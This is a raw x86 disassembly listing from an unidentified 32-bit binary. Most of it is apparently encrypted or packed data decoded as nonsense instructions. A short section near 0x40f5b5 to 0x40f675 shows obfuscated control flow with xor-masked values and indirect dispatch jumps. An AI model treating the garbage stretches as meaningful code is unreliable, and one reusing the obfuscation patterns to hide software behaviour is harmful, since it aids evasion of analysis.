  40f2ae:	xor    DWORD PTR [edx-0x35a43c0],0x1e1b5bdd
  40f2b8:	and    BYTE PTR [ebx-0x5e3d6833],bh
  40f2be:	jmp    0x5f3729e6
  40f2c3:	mov    edx,0xbd759b4a
  40f2c8:	push   0xe6fb268
  40f2cd:	mov    ebp,0xf64fae01
  40f2d2:	popa   
  40f2d3:	leave  
  40f2d4:	dec    eax
  40f2d5:	jmp    0x40f2f7
  40f2d7:	pop    ss
  40f2d8:	inc    eax
  40f2d9:	arpl   bx,bx
  40f2db:	cs scas eax,DWORD PTR es:[edi]
  40f2dd:	add    ebx,DWORD PTR [esi-0x5d]
  40f2e0:	ret    
  40f2e1:	mov    dh,0xf0
  40f2e3:	pop    edi
  40f2e4:	add    DWORD PTR [eax-0x70cdd0c4],ecx
  40f2ea:	aaa    
  40f2eb:	aas    
  40f2ec:	jo     0x40f334
  40f2ee:	(bad)  
  40f2ef:	sub    al,0xd1
  40f2f1:	call   0x5e4e2ed
  40f2f6:	aaa    
  40f2f7:	jle    0x40f2c6
  40f2f9:	int    0xa6
  40f2fb:	mov    bl,0x9a
  40f2fd:	adc    DWORD PTR [edx+0x6],edi
  40f300:	xor    DWORD PTR [ebp-0x6b4803af],edi
  40f306:	rcr    BYTE PTR [ebx+0x32],1
  40f309:	push   edx
  40f30a:	inc    ecx
  40f30b:	inc    esi
  40f30c:	inc    edi
  40f30d:	or     DWORD PTR [edx-0x6],eax
  40f310:	es inc edx
  40f312:	ss jae 0x40f308
  40f315:	shl    DWORD PTR [edi+0x5c],0x7e
  40f319:	mov    eax,ds:0xc0234925
  40f31e:	jmp    0x40f2b5
  40f320:	inc    eax
  40f321:	pop    ss
  40f322:	cmp    al,0x80
  40f324:	mov    cl,BYTE PTR [esi]
  40f326:	inc    ebx
  40f327:	jns    0x40f300
  40f329:	dec    ecx
  40f32a:	dec    ebp
  40f32b:	test   DWORD PTR [ebx+eax*8+0x6],edi
  40f32f:	xor    al,0x60
  40f331:	jne    0x40f340
  40f333:	imul   esi,DWORD PTR [edi-0x953d300],0xa
  40f33a:	ds pop eax
  40f33c:	sub    eax,0xfccb0fd7
  40f341:	sahf   
  40f342:	in     eax,0xd4
  40f344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f345:	mov    ch,0xf2
  40f347:	add    al,bh
  40f349:	popf   
  40f34a:	jmp    0xc03a:0x4a137663
  40f351:	sub    edx,DWORD PTR [ecx]
  40f353:	sub    bl,BYTE PTR [eax+0x7de69d4]
  40f359:	arpl   cx,dx
  40f35b:	jnp    0x40f2f1
  40f35d:	scas   al,BYTE PTR es:[edi]
  40f35e:	es leave 
  40f360:	int    0x98
  40f362:	mov    cl,0x16
  40f364:	xor    ah,ch
  40f366:	(bad)  [edi-0x4a]
  40f369:	mov    ebx,0x62abb504
  40f36e:	loope  0x40f373
  40f370:	xor    al,0x16
  40f372:	ja     0x40f36a
  40f374:	ins    BYTE PTR es:[edi],dx
  40f375:	jns    0x40f345
  40f377:	mov    ebx,0x59c82a9a
  40f37c:	mov    WORD PTR [eax-0x39a1971a],fs
  40f382:	mov    ebx,0xf89180ca
  40f387:	jecxz  0x40f3a3
  40f389:	push   esi
  40f38a:	xor    eax,0x1e8bf1b0
  40f38f:	fmul   QWORD PTR [edx]
  40f391:	imul   DWORD PTR [ebp-0xdaa5410]
  40f397:	cmovne ebx,eax
  40f39a:	test   BYTE PTR [ecx],dh
  40f39c:	je     0x40f3c2
  40f39e:	mov    ?,WORD PTR [ebx]
  40f3a0:	test   ebp,eax
  40f3a2:	add    BYTE PTR [ebp-0x2f],0xeb
  40f3a6:	jl     0x40f366
  40f3a8:	jno    0x40f3e4
  40f3aa:	loopne 0x40f391
  40f3ac:	popf   
  40f3ad:	xchg   ebp,eax
  40f3ae:	ret    
  40f3af:	sahf   
  40f3b0:	lds    ebx,FWORD PTR [ebp+0x57]
  40f3b3:	mov    ch,0x17
  40f3b5:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3b7:	aas    
  40f3b8:	jl     0x40f3dd
  40f3ba:	mov    eax,ds:0xd0056e14
  40f3bf:	or     al,BYTE PTR [edi]
  40f3c1:	in     al,0x8b
  40f3c3:	fsubrp st(5),st
  40f3c5:	or     ebx,DWORD PTR [ecx+0x38f3bf74]
  40f3cb:	inc    esi
  40f3cc:	and    ecx,DWORD PTR [ebx+0x4a]
  40f3cf:	mov    ecx,0x8d18913
  40f3d4:	xchg   DWORD PTR [ebx-0x53cd4217],edi
  40f3da:	inc    BYTE PTR [esi-0x237a9d49]
  40f3e0:	idiv   DWORD PTR [ebx-0x7d5d5203]
  40f3e6:	lock scas eax,DWORD PTR es:[edi]
  40f3e8:	add    ah,BYTE PTR [eax]
  40f3ea:	sub    bl,dl
  40f3ec:	pop    es
  40f3ed:	adc    BYTE PTR [ecx-0x21],0xe8
  40f3f1:	and    eax,0x3955a38
  40f3f6:	cmp    BYTE PTR [ebx+0xe],ch
  40f3f9:	mov    BYTE PTR [ecx],bl
  40f3fb:	jecxz  0x40f427
  40f3fd:	pop    es
  40f3fe:	add    ah,BYTE PTR [eax]
  40f400:	xchg   esi,eax
  40f401:	lds    eax,FWORD PTR [ebx+edx*1+0x60]
  40f405:	ins    DWORD PTR es:[edi],dx
  40f406:	mov    DWORD PTR [eax+ebx*4+0x4186ba2a],eax
  40f40d:	lock xchg ebx,eax
  40f40f:	clc    
  40f410:	xchg   ecx,eax
  40f411:	retf   
  40f412:	fstp   QWORD PTR [eax]
  40f414:	into   
  40f415:	sub    al,0x13
  40f417:	add    esp,DWORD PTR [eax*8-0x11b4ff86]
  40f41e:	mov    al,0x22
  40f421:	cwde   
  40f422:	(bad)  
  40f423:	ss enter 0xf739,0x2a
  40f428:	ins    BYTE PTR es:[edi],dx
  40f429:	les    esp,FWORD PTR [ecx-0x21]
  40f42c:	out    dx,al
  40f42d:	jnp    0x40f44d
  40f42f:	neg    BYTE PTR [ecx]
  40f431:	fsubr  QWORD PTR [eax]
  40f433:	cld    
  40f434:	push   eax
  40f435:	pushf  
  40f436:	into   
  40f437:	test   DWORD PTR [edx+0x5e353bc7],ebp
  40f43d:	shr    DWORD PTR ds:0x83e1de80,1
  40f443:	sbb    al,0xe4
  40f445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f446:	jo     0x40f47a
  40f448:	mov    BYTE PTR [esi+eiz*2-0x78],0x74
  40f44d:	xor    bh,BYTE PTR [ecx-0x7b505a54]
  40f453:	xchg   ecx,eax
  40f455:	les    edi,FWORD PTR [ebx]
  40f457:	and    esp,DWORD PTR [esp+ebp*2]
  40f45a:	jmp    0xa7128df6
  40f45f:	test   DWORD PTR [ebx+0x5fc20c41],esi
  40f465:	xor    eax,0x2c9ba6b7
  40f46a:	int3   
  40f46b:	scas   al,BYTE PTR es:[edi]
  40f46c:	xchg   esi,eax
  40f46d:	into   
  40f46e:	fnsave [eax-0x3]
  40f471:	jg     0x40f4a9
  40f473:	push   eax
  40f474:	fsub   QWORD PTR [edi+0x61]
  40f477:	push   ss
  40f478:	std    
  40f479:	fpatan 
  40f47b:	popa   
  40f47c:	sti    
  40f47d:	out    dx,al
  40f47e:	sbb    edx,DWORD PTR [edi+esi*2]
  40f481:	xor    dl,BYTE PTR [eax]
  40f483:	push   ds
  40f484:	out    0x81,al
  40f486:	xchg   ecx,eax
  40f487:	mov    ebp,0x918387dc
  40f48c:	fst    QWORD PTR [eax+0x379d7e41]
  40f492:	test   BYTE PTR [edx],bl
  40f494:	jmp    0x724e:0x97871cb9
  40f49b:	sbb    ebx,DWORD PTR [edi-0x31]
  40f49e:	mov    al,ds:0x6a38a50b
  40f4a3:	xchg   DWORD PTR [edi],ecx
  40f4a5:	sub    ah,dh
  40f4a7:	in     al,dx
  40f4a8:	jno    0x40f47f
  40f4aa:	sub    ch,BYTE PTR [esi+0x17]
  40f4ad:	(bad)  
  40f4ae:	sbb    bh,BYTE PTR [ebx]
  40f4b0:	or     DWORD PTR [esi],0x7aa3ca83
  40f4b6:	cs mov bl,0xdd
  40f4b9:	mov    al,ds:0x5f3c1084
  40f4be:	aaa    
  40f4bf:	fist   WORD PTR [esp+eax*2-0x7368911c]
  40f4c6:	jl     0x40f466
  40f4c8:	cmp    al,0x9b
  40f4ca:	arpl   di,si
  40f4cc:	jae    0x40f464
  40f4ce:	or     ebp,DWORD PTR [eax]
  40f4d0:	cmp    ecx,ebx
  40f4d2:	pop    ss
  40f4d3:	jno    0x40f4a5
  40f4d5:	test   BYTE PTR [edx],dh
  40f4d7:	aas    
  40f4d8:	shr    DWORD PTR [edi],0x50
  40f4db:	push   esp
  40f4dc:	or     bl,al
  40f4de:	xchg   DWORD PTR [ecx+0x43322d11],esi
  40f4e4:	jne    0x40f50a
  40f4e6:	sti    
  40f4e7:	jnp    0x40f4f0
  40f4e9:	mov    bl,0xdf
  40f4eb:	pop    ds
  40f4ec:	pushf  
  40f4ed:	inc    edi
  40f4ee:	and    edi,edx
  40f4f0:	psubq  mm2,QWORD PTR [edx]
  40f4f3:	inc    ecx
  40f4f4:	xchg   esp,eax
  40f4f5:	retf   
  40f4f6:	xchg   esi,eax
  40f4f7:	jae    0x40f47f
  40f4f9:	mov    esp,0x829a0339
  40f4fe:	stos   BYTE PTR es:[edi],al
  40f4ff:	jecxz  0x40f51b
  40f501:	rep outs dx,BYTE PTR ds:[esi]
  40f503:	fld    TBYTE PTR [eax+0x42]
  40f506:	mov    cl,0xb3
  40f509:	bound  esi,QWORD PTR [ecx]
  40f50b:	popf   
  40f50c:	sub    dh,BYTE PTR [ebp+0x51]
  40f50f:	dec    ecx
  40f510:	xchg   edx,eax
  40f511:	js     0x40f57c
  40f513:	inc    esp
  40f514:	ficomp DWORD PTR [eax]
  40f516:	inc    ebp
  40f517:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f518:	int    0x7f
  40f51a:	jbe    0x40f517
  40f51c:	adc    DWORD PTR ds:0x54937f66,edi
  40f522:	inc    edi
  40f523:	gs aam 0x93
  40f526:	aas    
  40f527:	div    edi
  40f529:	mov    al,ds:0x6dd507ff
  40f52e:	mov    edi,0x4786f4a7
  40f533:	or     edx,eax
  40f535:	imul   edi,ebp,0xa053be8
  40f53b:	xor    cl,dl
  40f53d:	stos   BYTE PTR es:[edi],al
  40f53e:	inc    ecx
  40f53f:	mov    ch,0xa1
  40f541:	cmovb  edx,DWORD PTR [eax]
  40f544:	scas   al,BYTE PTR es:[edi]
  40f545:	and    al,BYTE PTR [eax-0x60c1ce3b]
  40f54b:	dec    ebx
  40f54c:	jmp    0x40f556
  40f54e:	cwde   
  40f54f:	cmp    ebx,DWORD PTR [edi+0x33]
  40f552:	in     al,0x65
  40f554:	dec    esp
  40f555:	ds pusha 
  40f557:	or     ch,BYTE PTR [edi+0x187f55e5]
  40f55d:	mov    eax,0x13a0391e
  40f562:	sub    DWORD PTR [ebx+0x7d],edi
  40f565:	sub    al,0x38
  40f567:	jno    0x40f542
  40f569:	sbb    ebx,DWORD PTR [edi-0x38a89618]
  40f56f:	pop    edx
  40f570:	push   edi
  40f571:	les    esi,FWORD PTR [eax]
  40f573:	mov    al,0x6a
  40f575:	imul   edi,DWORD PTR [ecx-0x67],0x69494c5
  40f57c:	xchg   ecx,eax
  40f57d:	nop
  40f57e:	mov    eax,0x543acc35
  40f583:	push   0xd228fd2
  40f588:	jo     0x40f535
  40f58a:	fist   DWORD PTR [edi+0x35ad2a0c]
  40f590:	std    
  40f591:	mov    si,bx
  40f594:	or     al,0xf8
  40f596:	hlt    
  40f597:	aam    0xde
  40f599:	push   ds
  40f59a:	jns    0x40f556
  40f59c:	jmp    0xa3423499
  40f5a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5a2:	push   es
  40f5a3:	aam    0xbc
  40f5a5:	mov    BYTE PTR [ecx-0xa],bh
  40f5a8:	mov    BYTE PTR [esi],dl
  40f5aa:	dec    edi
  40f5ab:	adc    DWORD PTR [ebx-0x19f8fd89],0x35
  40f5b2:	push   es
  40f5b3:	cmp    ecx,eax
  40f5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40f5b8:	je     0x40f617
  40f5be:	mov    ecx,DWORD PTR [ebp-0x30]
  40f5c1:	xor    eax,esi
  40f5c3:	add    eax,edi
  40f5c5:	cmp    ecx,eax
  40f5c7:	je     0x40f620
  40f5cd:	lea    eax,[ebp-0x8]
  40f5d0:	push   eax
  40f5d1:	push   DWORD PTR [ebp-0x28]
  40f5d4:	push   DWORD PTR [ebp+0xc]
  40f5d7:	call   0x411bb3
  40f5dc:	mov    eax,DWORD PTR [ebp-0x4]
  40f5df:	mov    ecx,DWORD PTR [ebp-0x8]
  40f5e2:	xor    eax,esi
  40f5e4:	add    eax,edi
  40f5e6:	cmp    ecx,eax
  40f5e8:	je     0x40f603
  40f5ee:	mov    eax,DWORD PTR [ebp-0x34]
  40f5f1:	movzx  eax,WORD PTR [eax+ebx*2]
  40f5f5:	mov    ecx,DWORD PTR [ebp-0x14]
  40f5f8:	mov    eax,DWORD PTR [ecx+eax*4]
  40f5fb:	mov    DWORD PTR [ebp-0x38],eax
  40f5fe:	jmp    0x40d1fa
  40f603:	mov    eax,DWORD PTR [ebp-0xc]
  40f606:	xor    eax,esi
  40f608:	lea    ebx,[ebx+eax*1+0x3272f6]
  40f60f:	jmp    0x40cf5b
  40f614:	mov    eax,DWORD PTR [ebp-0x4]
  40f617:	xor    eax,esi
  40f619:	add    eax,edi
  40f61b:	jmp    0x411aee
  40f620:	mov    eax,DWORD PTR [ebp-0x38]
  40f623:	add    eax,DWORD PTR [ebp+0x8]
  40f626:	mov    DWORD PTR [ebp-0x18],eax
  40f629:	mov    eax,DWORD PTR [ebp-0x1c]
  40f62c:	test   eax,eax
  40f62e:	je     0x411a77
  40f634:	mov    DWORD PTR [ebp-0x20],0x0
  40f63b:	push   0x3
  40f63d:	xor    edx,edx
  40f63f:	pop    edx
  40f640:	add    edx,0x8
  40f643:	push   edx
  40f644:	pop    ecx
  40f645:	push   0x6
  40f647:	dec    ecx
  40f648:	pop    ebx
  40f649:	dec    ebx
  40f64a:	xchg   ebx,ecx
  40f64c:	sub    ebx,ecx
  40f64e:	xchg   ebx,ecx
  40f650:	dec    ecx
  40f651:	mov    eax,DWORD PTR [ebp-0x1c]
  40f654:	imul   eax,ecx
  40f657:	sub    esp,eax
  40f659:	mov    DWORD PTR [ebp-0x20],esp
  40f65c:	mov    eax,DWORD PTR [ebp-0x4]
  40f65f:	xor    eax,esi
  40f661:	add    eax,edi
  40f663:	jmp    0x411a50
  40f668:	mov    ecx,DWORD PTR [ebp-0xc]
  40f66b:	mov    eax,DWORD PTR [ebp+0x8]
  40f66e:	mov    edx,DWORD PTR [ebp+0x14]
  40f671:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40f675:	jmp    0x411a24
  40f67a:	push   edi
  40f67b:	into   
  40f67c:	cmc    
  40f67d:	pop    ss
  40f67e:	in     al,0x4
  40f680:	xchg   ebp,eax
  40f681:	mov    ?,WORD PTR [edi-0x6a3da05]
  40f687:	test   eax,0xafc39161
  40f68c:	add    DWORD PTR [ebx-0x7c7c9f0f],0xffffff8e
  40f693:	hlt    
  40f694:	xchg   edi,eax
  40f695:	rcr    DWORD PTR [edx*1-0x347a76e5],1
  40f69c:	xor    BYTE PTR [edx+0x6aca180],ah
  40f6a2:	jb     0x40f715
  40f6a4:	in     al,dx
  40f6a5:	sub    eax,0x8f4cadf6
  40f6aa:	popa   
  40f6ab:	sub    DWORD PTR [edi],ebp
  40f6ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6ae:	leave  
  40f6af:	into   
  40f6b0:	mov    WORD PTR ds:[ebx],fs
  40f6b3:	and    esi,DWORD PTR [eax]
  40f6b5:	rcl    DWORD PTR [bx+di+0x31a5],cl
  40f6ba:	movsx  esp,BYTE PTR [ecx+0x6f]
  40f6be:	sbb    ebx,DWORD PTR [ecx+ecx*1+0x5a]
  40f6c2:	add    eax,0x628200c4
  40f6c7:	mov    bl,0x55
  40f6c9:	xor    DWORD PTR [eax+0x22],esp
  40f6cc:	(bad)  
  40f6cd:	(bad)  
  40f6ce:	xor    al,0x2f
  40f6d0:	add    al,0x38
  40f6d2:	push   esi
  40f6d3:	ins    DWORD PTR es:[edi],dx
  40f6d4:	xlat   BYTE PTR ds:[ebx]
  40f6d5:	shl    DWORD PTR [ebp+eiz*1-0x61],cl
  40f6d9:	or     eax,0x8a8afc65
  40f6de:	mov    ah,0xf3
  40f6e0:	dec    eax
  40f6e1:	loopne 0x40f6a5
  40f6e3:	mov    al,ds:0x6022687b
  40f6e8:	fwait
  40f6e9:	lock xchg ebx,eax
  40f6eb:	retf   0x3688
  40f6ee:	test   eax,0xf75df5f4
  40f6f3:	jp     0x40f74f
  40f6f5:	fadd   QWORD PTR [edi+0x22]
  40f6f8:	jg     0x40f6bc
  40f6fa:	or     eax,0x4a2456ba
  40f6ff:	push   ds
  40f700:	repnz (bad) 
  40f702:	(bad)  
  40f704:	in     eax,dx
  40f705:	push   0x20
  40f707:	pop    esp
  40f708:	dec    esi
  40f709:	call   0xad7f:0x867cd03a
  40f710:	popa   
  40f711:	ins    BYTE PTR es:[edi],dx
  40f712:	and    DWORD PTR [ebx],ebx
  40f714:	inc    esp
  40f715:	adc    DWORD PTR [edx-0x35],eax
  40f718:	in     al,dx
  40f719:	or     al,dl
  40f71b:	clc    
  40f71c:	clc    
  40f71d:	push   ebp
  40f71e:	pmulhw mm1,QWORD PTR [ebp-0x18984119]
  40f725:	add    BYTE PTR [esi-0x7f],0x88
  40f729:	inc    edi
  40f72a:	rol    BYTE PTR [edi],cl
  40f72c:	lods   eax,DWORD PTR ds:[esi]
  40f72d:	ins    DWORD PTR es:[edi],dx
  40f72e:	lods   eax,DWORD PTR ds:[esi]
  40f72f:	adc    BYTE PTR [edi-0x68aaa803],cl
  40f735:	adc    ecx,ebp
  40f737:	jl     0x40f75b
  40f739:	push   ss
  40f73a:	(bad)  
  40f73b:	arpl   WORD PTR [ebx],cx
  40f73d:	inc    ebx
  40f73e:	push   es
  40f73f:	into   
  40f740:	into   
  40f741:	pusha  
  40f742:	xor    eax,0x62dbf804
  40f747:	xchg   esp,eax
  40f748:	cmc    
  40f749:	adc    dh,ah
  40f74b:	aam    0x57
  40f74d:	sub    al,0x47
  40f74f:	pop    ebp
  40f750:	scas   eax,DWORD PTR es:[edi]
  40f751:	sub    al,0x3e
  40f753:	lods   al,BYTE PTR ds:[esi]
  40f754:	mul    BYTE PTR [esi]
  40f756:	pop    ebp
  40f757:	(bad)  
  40f758:	jle    0x40f766
  40f75a:	xchg   edi,eax
  40f75b:	jno    0x40f730
  40f75d:	add    edi,esp
  40f75f:	xor    DWORD PTR ds:0x989ddcce,eax
  40f765:	arpl   dx,bx
  40f767:	pop    ss
  40f768:	int    0xe3
  40f76a:	data16 in al,dx
  40f76c:	xchg   ebx,eax
  40f76d:	in     al,dx
  40f76e:	lods   al,BYTE PTR ds:[esi]
  40f76f:	arpl   WORD PTR [eax-0x23110441],si
  40f775:	xor    BYTE PTR [eax-0x56],bl
  40f778:	test   BYTE PTR [ebx+0x6a],cl
  40f77b:	pusha  
  40f77c:	or     BYTE PTR [edi],ah
  40f77e:	mov    DWORD PTR [esi+ebx*4+0x55],ecx
  40f782:	mov    ss,WORD PTR [eax]
  40f784:	pusha  
  40f785:	pusha  
  40f786:	mov    DWORD PTR gs:[ebx-0x31a4332c],0x6fa950de
  40f791:	lea    ebp,[ebx+ecx*4-0x22b2eac2]
  40f798:	jmp    0x3ef0be9e
  40f79d:	scas   eax,DWORD PTR es:[edi]
  40f79e:	arpl   WORD PTR [edx+esi*2],sp
  40f7a1:	stos   DWORD PTR es:[edi],eax
  40f7a2:	mul    BYTE PTR [ebx-0x4abdc88c]
  40f7a8:	jecxz  0x40f7d9
  40f7aa:	fucomp st(0)
  40f7ac:	mov    ebp,0xa4ef98a8
  40f7b1:	test   al,0x28
  40f7b3:	or     ebx,ebx
  40f7b5:	ds mov ah,0x6
  40f7b8:	bnd ret 
  40f7ba:	lock mov edi,0xc07ce880
  40f7c0:	test   al,0xd8
  40f7c2:	iret   
  40f7c3:	pop    ecx
  40f7c4:	out    dx,al
  40f7c5:	int    0x8a
  40f7c7:	xor    al,0x3d
  40f7c9:	ds into 
  40f7cb:	jbe    0x40f7a6
  40f7cd:	mov    eax,0x10bf7338
  40f7d2:	pop    esi
  40f7d3:	mov    ch,0xdc
  40f7d5:	mov    bl,0x5e
  40f7d7:	aad    0x88
  40f7d9:	jno    0x40f7a4
  40f7db:	and    DWORD PTR [edx-0x49],ecx
  40f7de:	jb     0x40f851
  40f7e0:	bound  ebp,QWORD PTR [eax+0x2d64c2cd]
  40f7e6:	clc    
  40f7e7:	fstp   TBYTE PTR ds:0xfbad10e8
  40f7ed:	push   ss
  40f7ee:	aam    0xb
  40f7f0:	test   al,0x30
  40f7f2:	jns    0x40f840
  40f7f4:	mov    esi,DWORD PTR [ecx+0x3427bd2c]
  40f7fa:	rol    BYTE PTR [eax],1
  40f7fc:	push   ecx
  40f7fd:	jp     0x40f794
  40f7ff:	mov    eax,ds:0x48d7e604
  40f804:	inc    edi
  40f805:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f806:	xor    ah,BYTE PTR [ebx-0x7a9a97f9]
  40f80c:	repnz mov ?,WORD PTR [esi-0x1f]
  40f810:	push   0xb
  40f812:	sti    
  40f813:	ror    DWORD PTR fs:[edx],0x6e
  40f817:	sub    dh,BYTE PTR [ebx]
  40f819:	xchg   esi,eax
  40f81a:	mov    WORD PTR [esi+0x21138d56],gs
  40f820:	dec    esp
  40f821:	or     ebx,DWORD PTR [edx+ebp*2-0x54dc5283]
  40f828:	jb     0x40f856
  40f82a:	fidivr DWORD PTR ds:0xc08d8bde
  40f830:	call   FWORD PTR ds:0x78604f18
  40f836:	test   eax,0xcb228450
  40f83b:	jle    0x40f810
  40f83d:	(bad)  
  40f83e:	or     ebx,DWORD PTR [ebp-0x34afe8b5]
  40f844:	in     eax,dx
  40f845:	out    dx,eax
  40f846:	cld    
  40f847:	pop    esp
  40f848:	xchg   DWORD PTR [edi+0x3c2ec5dc],esi
  40f84e:	inc    edx
  40f84f:	xor    al,BYTE PTR ss:[esi+esi*2]
  40f853:	mov    ah,BYTE PTR [ebp+0x53]
  40f856:	add    cl,dl
  40f858:	jo     0x40f805
  40f85a:	add    eax,0x63b111be
  40f85f:	jnp    0x40f881
  40f861:	xor    BYTE PTR [edx-0x6b],bh
  40f864:	(bad)  
  40f865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f866:	push   0x23
  40f868:	cmp    DWORD PTR [ecx-0x9],esi
  40f86b:	pusha  
  40f86c:	(bad)  
  40f86d:	pop    edi
  40f86e:	hlt    
  40f86f:	fld    TBYTE PTR [ebx+0x12]
  40f872:	rcr    BYTE PTR [ecx-0x42],cl
  40f875:	icebp  
  40f876:	mov    ah,0xfa
  40f878:	mov    esi,0x4a1051d
  40f87d:	push   esp
  40f87e:	sar    DWORD PTR [esi+0x5],cl
  40f881:	(bad)  
  40f882:	(bad)  
  40f883:	jmp    0xab1f6773
  40f888:	cs sub eax,0x864ae231
  40f88e:	mov    edi,0x4e3890b9
  40f893:	cs push edi
  40f895:	mov    ?,WORD PTR [eax+0x1b]
  40f898:	stos   BYTE PTR es:[edi],al
  40f899:	icebp  
  40f89a:	icebp  
  40f89b:	xchg   esp,eax
  40f89c:	loope  0x40f8c3
  40f89e:	push   eax
  40f89f:	arpl   WORD PTR [ecx+0x5a48e9bd],sp
  40f8a5:	clc    
  40f8a6:	push   0x3c
  40f8a8:	xchg   al,cl
  40f8aa:	and    edx,DWORD PTR [esi-0x9682a7a]
  40f8b0:	arpl   si,bx
  40f8b2:	cli    
  40f8b3:	mov    edi,DWORD PTR [edx+0x11799cb0]
  40f8b9:	inc    ebp
  40f8ba:	xchg   ebx,eax
  40f8bb:	hlt    
  40f8bc:	xor    al,0xce
  40f8be:	push   DWORD PTR [ebp-0x579ff88a]
  40f8c4:	fmul   QWORD PTR [edx]
  40f8c6:	mov    ds:0xa0e1582c,al
  40f8cb:	add    ecx,DWORD PTR [ebx-0x2b]
  40f8ce:	cmp    ch,BYTE PTR [ebx-0x59]
  40f8d1:	dec    esp
  40f8d2:	jnp    0x40f89a
  40f8d4:	gs scas eax,DWORD PTR es:[edi]
  40f8d6:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8d8:	add    ebx,DWORD PTR [edx+0x1f42e582]
  40f8de:	arpl   di,bx
  40f8e0:	bound  edi,QWORD PTR ds:0x482d88b9
  40f8e6:	cmp    BYTE PTR [ecx],ch
  40f8e8:	les    ecx,FWORD PTR [ebx+0x552f59ea]
  40f8ee:	cwde   
  40f8ef:	enter  0xac88,0xb9
  40f8f3:	lds    edi,FWORD PTR [eax+ebx*8+0x30a99a94]
  40f8fa:	imul   ecx,DWORD PTR [ebp+0xd],0x8b2b83ea
  40f901:	outs   dx,BYTE PTR ds:[esi]
  40f902:	stos   BYTE PTR es:[edi],al
  40f903:	jbe    0x40f8f7
  40f905:	mov    bh,BYTE PTR [esi+0x5f]
  40f908:	(bad)  
  40f909:	rcr    dh,cl
  40f90b:	push   es
  40f90c:	mov    edi,0x5f174bd6
  40f911:	jne    0x40f924
  40f913:	ins    DWORD PTR es:[edi],dx
  40f914:	rol    DWORD PTR [ebx-0x4],1
  40f917:	xchg   edx,edx
  40f919:	lods   al,BYTE PTR ds:[esi]
  40f91a:	push   cs
  40f91b:	call   0x86c:0xe4c5a6b5
  40f922:	mov    esi,0x4a4d4681
  40f927:	pop    eax
  40f928:	stos   BYTE PTR es:[edi],al
  40f929:	test   BYTE PTR [ebx-0x1b],0xe
  40f92d:	pop    esp
  40f92e:	mov    WORD PTR [edi+0x3],gs
  40f931:	ds mov dh,0xd9
  40f934:	dec    eax
  40f935:	xor    ebp,ebx
  40f937:	or     eax,0x31c7918
  40f93c:	sub    DWORD PTR [ebx+0x8],0x3bcd1f6
  40f943:	cdq    
  40f944:	loope  0x40f8e1
  40f946:	xor    DWORD PTR [edi-0x10],edx
  40f949:	jbe    0x40f93a
  40f94b:	push   esp
  40f94c:	or     al,0x4d
  40f94e:	cmp    eax,0xcbd634cf
  40f953:	arpl   WORD PTR [eax+0x3c],ax
  40f956:	(bad)  
  40f957:	icebp  
  40f958:	push   eax
  40f959:	leave  
  40f95a:	iret   
  40f95b:	scas   eax,DWORD PTR es:[edi]
  40f95c:	jle    0x40f955
  40f95e:	je     0x40f9b4
  40f960:	ja     0x40f954
  40f962:	dec    esi
  40f963:	mov    edx,0x5843db81
  40f968:	(bad)  
  40f96a:	gs fs aas 
  40f96d:	out    0x6b,eax
  40f96f:	icebp  
  40f970:	sub    al,0x5d
  40f972:	xchg   edx,eax
  40f973:	or     DWORD PTR [ebx],edx
  40f975:	sub    dh,bl
  40f977:	imul   esp,DWORD PTR [edx+0x419e42f4],0x9a64d7ed
  40f981:	test   DWORD PTR [eax-0x37],0x3e9726fd
  40f988:	jbe    0x40f974
  40f98a:	not    DWORD PTR [edi-0x23]
  40f98d:	cmc    
  40f98e:	sub    BYTE PTR [eax-0x7131f0d3],ah
  40f994:	daa    
  40f995:	dec    esp
  40f996:	sar    DWORD PTR [ebx],0xcf
  40f999:	mov    cl,0xb8
  40f99b:	push   ds
  40f99c:	jb     0x40f92b
  40f99e:	push   edx
  40f99f:	cli    
  40f9a0:	jmp    0x2808:0x5a832851
  40f9a7:	lds    esp,FWORD PTR [eax+ebx*8-0x78]
  40f9ab:	mov    cl,0x36
  40f9ad:	ror    bl,0x6c
  40f9b0:	and    ch,ah
  40f9b2:	lods   al,BYTE PTR ds:[esi]
  40f9b3:	das    
  40f9b4:	and    BYTE PTR [edx-0x6e],al
  40f9b7:	jle    0x40fa30
  40f9b9:	shl    BYTE PTR [eax-0x3d718ff5],1
  40f9bf:	xor    al,BYTE PTR ds:0x97b294cb
  40f9c5:	mov    esp,0xb4d3ab00
  40f9ca:	sub    eax,0x3b16ba28
  40f9cf:	xor    al,0xff
  40f9d1:	sub    DWORD PTR [esi],esp
  40f9d3:	push   0x48
  40f9d5:	pavgw  mm6,mm3
  40f9d8:	fcomp  QWORD PTR [ebp-0x40]
  40f9db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9dc:	aam    0xdb
  40f9de:	jb     0x40fa40
  40f9e0:	dec    edx
  40f9e1:	add    ah,BYTE PTR [edi]
  40f9e3:	mov    al,ds:0x480d2a31
  40f9e8:	jbe    0x40fa2f
  40f9ea:	icebp  
  40f9eb:	cwde   
  40f9ec:	outs   dx,DWORD PTR ds:[esi]
  40f9ed:	xchg   edx,eax
  40f9ee:	and    cl,BYTE PTR [edx-0x2d5079d2]
  40f9f4:	pop    ebp
  40f9f5:	pushf  
  40f9f6:	loop   0x40fa68
  40f9f8:	mov    eax,0x5cb60527
  40f9fd:	pushf  
  40f9fe:	iret   
  40f9ff:	ret    
  40fa00:	ret    
  40fa01:	jns    0x40f9e9
  40fa03:	dec    eax
  40fa04:	lods   al,BYTE PTR ds:[esi]
  40fa05:	jno    0x40fa27
  40fa07:	das    
  40fa08:	xor    al,0x30
  40fa0a:	call   0x7962:0xf6219bb8
  40fa11:	jmp    0x8003:0x7743e489
  40fa18:	sbb    al,BYTE PTR ss:[esp+ecx*1-0x5c7e0842]
  40fa20:	test   DWORD PTR [edi],ecx
  40fa22:	cmp    DWORD PTR [eax],ebx
  40fa24:	push   eax
  40fa25:	fcmovb st,st(6)
  40fa27:	pop    eax
  40fa28:	push   esi
